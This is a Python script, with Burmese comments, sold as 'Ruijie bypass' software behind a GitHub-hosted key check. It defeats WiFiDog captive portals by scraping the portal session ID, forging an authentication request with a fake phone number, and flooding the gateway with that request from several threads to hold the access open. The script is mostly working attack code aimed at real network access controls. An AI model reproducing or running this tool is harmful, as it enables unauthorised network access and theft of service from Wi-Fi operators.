import os
import requests
import re
import urllib3
import time
import threading
import logging
import random
import uuid
import sys
from urllib.parse import urlparse, parse_qs, urljoin
from colorama import Fore, Back, Style, init

# SSL Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ===============================
# LICENSE CONFIG
# ===============================
# User Name ကို htethtet277-svg လို့ အမှန်ပြင်ထားပါတယ်
GITHUB_URL = "https://raw.githubusercontent.com/htethtet277-svg/m/main/key.txt"
KEY_FILE = os.path.join(os.path.expanduser("~"), ".device_key")

# ===============================
# BYPASS CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

stop_event = threading.Event()

# ===============================
# SYSTEM FUNCTIONS
# ===============================
def get_or_create_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            return f.read().strip()
    else:
        new_key = str(uuid.uuid4())[:12].upper()
        with open(KEY_FILE, "w") as f:
            f.write(new_key)
        return new_key

def check_real_internet():
    try:
        return requests.get("http://1.1.1.1", timeout=3).status_code == 200
    except:
        return False

def h_banner():
    os.system('clear')
    print(f"{Fore.MAGENTA}{'='*55}")
    print(f"{Fore.CYAN}  █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗")
    print(f"{Fore.CYAN} ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║")
    print(f"{Fore.CYAN} ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║")
    print(f"{Fore.CYAN} ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║")
    print(f"{Fore.CYAN} ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║")
    print(f"{Fore.CYAN} ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝")
    print(f"{Fore.MAGENTA}{'='*55}")
    print(f"{Fore.WHITE}{Back.RED}      MY RUIJIE BYPASS PRO | OWNER: HH TET TET      ")
    print(f"{Style.RESET_ALL}{Fore.MAGENTA}{'='*55}\n")

# ===============================
# BYPASS CORE LOGIC
# ===============================
def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5)
            print(f"{Fore.GREEN}[✓]{Fore.RESET} SID: {sid} | Pulse Active...           ", end="\r")
        except:
            print(f"{Fore.RED}[X]{Fore.RESET} Connection Lost...               ", end="\r")
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_bypass_process():
    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{Fore.YELLOW}[•]{Fore.RESET} Internet Active... Ready        ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{Fore.CYAN}[*] Captive Portal Detected: {portal_host}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                time.sleep(5)
                continue

            print(f"{Fore.GREEN}[✓]{Fore.RESET} Captured Session ID: {sid}")

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
            print(f"{Fore.MAGENTA}[*] Launching Pulse Threads...{Fore.RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            while check_real_internet():
                time.sleep(5)

        except Exception as e:
            time.sleep(5)

# ===============================
# LICENSE VERIFICATION
# ===============================
def verify_license():
    h_banner()
    user_key = get_or_create_key()
    print(f"{Fore.YELLOW}[i] Checking security clearance...")
    print(f"{Fore.WHITE}└─ Your Device ID: {Fore.GREEN}{user_key}")
    print(f"{Fore.CYAN}{'─'*55}")

    try:
        response = requests.get(GITHUB_URL, timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            for line in lines:
                if "|" in line:
                    key, status = line.split("|")
                    if key.strip() == user_key:
                        if status.strip().upper() == "ACTIVE":
                            print(f"{Fore.CYAN}[+] Status: {Fore.BLACK}{Back.GREEN} ACTIVE ")
                            print(f"{Fore.GREEN}✅ Access Granted! Launching...")
                            time.sleep(1)
                            return True
                        else:
                            print(f"{Fore.RED}[!] Status: {Fore.BLACK}{Back.RED} BANNED ")
                            sys.exit()
            
            print(f"{Fore.RED}❌ ERROR: DEVICE ID NOT REGISTERED")
            print(f"{Fore.YELLOW}GitHub က key.txt ထဲမှာ အောက်ပါအတိုင်း သွားထည့်ပေးပါ:")
            print(f"{Fore.WHITE}{Back.BLUE} {user_key}|ACTIVE ")
            sys.exit()
        else:
            print(f"{Fore.RED}❌ SERVER ERROR: {response.status_code}")
            sys.exit()
    except Exception:
        print(f"{Fore.RED}❌ ERROR: CANNOT CONNECT TO GITHUB")
        sys.exit()

# ===============================
# ENTRY POINT
# ===============================
if __name__ == "__main__":
    try:
        if verify_license():
            start_bypass_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{Fore.RED}Exiting...{Fore.RESET}")
